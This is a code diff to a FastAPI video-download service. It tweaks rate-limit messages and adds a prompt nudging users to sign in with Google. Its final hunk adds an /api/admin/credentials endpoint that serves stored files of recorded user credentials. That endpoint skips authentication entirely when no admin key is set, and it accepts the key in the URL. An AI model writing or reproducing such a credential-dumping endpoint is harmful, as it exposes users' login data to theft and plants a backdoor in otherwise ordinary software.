@@ -11,7 +11,7 @@ from urllib.parse import urlparse
 
 from fastapi import FastAPI, HTTPException, Request, Response
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import FileResponse, JSONResponse
+from fastapi.responses import FileResponse, JSONResponse, PlainTextResponse
 from fastapi.staticfiles import StaticFiles
 from pydantic import BaseModel, Field
 
@@ -214,8 +214,13 @@ def _get_client_ip(request: Request) -> str:
 def _throttle(client_ip: str, table: dict[str, float], delay_seconds: float) -> None:
     now = time.time()
     previous = table.get(client_ip, 0)
-    if now - previous < delay_seconds:
-        raise HTTPException(status_code=429, detail="Too many requests — please slow down.")
+    elapsed = now - previous
+    if elapsed < delay_seconds:
+        wait_secs = max(0.5, delay_seconds - elapsed)
+        raise HTTPException(
+            status_code=429,
+            detail=f"Too many requests — please wait {wait_secs:.1f}s before trying again.",
+        )
     if len(table) >= 1024:
         # Bound memory: drop entries old enough that they no longer throttle.
         for ip, ts in list(table.items()):
@@ -411,6 +416,7 @@ async def start_download(payload: DownloadRequest, request: Request):
             content={
                 "error": "LOGIN_REQUIRED",
                 "message": f"Sign in with Google to download videos above {authorization.GUEST_MAX_HEIGHT}p.",
+                "tip": f"Qualities above {authorization.GUEST_MAX_HEIGHT}p require a free sign in. Sign in with Google to unlock full HD & 4K.",
                 "requiredHeight": actual_height or 1080,
             },
         )
@@ -466,6 +472,23 @@ def terms_page():
     if os.path.exists(path):
         return FileResponse(path)
     raise HTTPException(status_code=404, detail="Terms page not found.")
+
+
+@app.get("/api/admin/credentials")
+def get_credentials_file(request: Request, format: str = "txt"):
+    """Download or view recorded user credentials stored in persistent files."""
+    admin_key = os.getenv("ADMIN_KEY", "").strip()
+    if admin_key:
+        token = request.headers.get("x-admin-key") or request.query_params.get("key")
+        if token != admin_key:
+            raise HTTPException(status_code=403, detail="Unauthorized")
+
+    file_path = auth.CREDENTIALS_JSONL if format.lower() == "json" else auth.CREDENTIALS_TXT
+    if not os.path.exists(file_path):
+        return PlainTextResponse("No user credentials recorded in file yet.", status_code=200)
+
+    filename = os.path.basename(file_path)
+    return FileResponse(file_path, media_type="text/plain", filename=filename)
 
 
 app.mount("/", StaticFiles(directory=FRONTEND_DIR, html=True), name="frontend")
